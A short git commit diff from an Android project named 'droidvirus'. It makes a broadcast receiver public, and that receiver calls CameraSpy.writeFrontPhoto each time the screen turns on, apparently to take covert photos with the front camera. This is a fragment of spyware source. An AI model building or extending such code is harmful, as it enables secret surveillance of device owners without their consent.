60d8c6397f3b9875cdd054ae1872bb6f606b5fa6
Artisanter <chyzhyk99@gmail.com>
2019-12-12 03:21:08 +0300

    Public receivers

--- app/src/main/java/com/artisanter/droidvirus/ScreenOnReceiver.java
+++ app/src/main/java/com/artisanter/droidvirus/ScreenOnReceiver.java
@@ -4,7 +4,7 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 
-class ScreenOnReceiver extends BroadcastReceiver{
+public class ScreenOnReceiver extends BroadcastReceiver{
     @Override
     public void onReceive(Context context, Intent intent){
         CameraSpy.writeFrontPhoto(context);
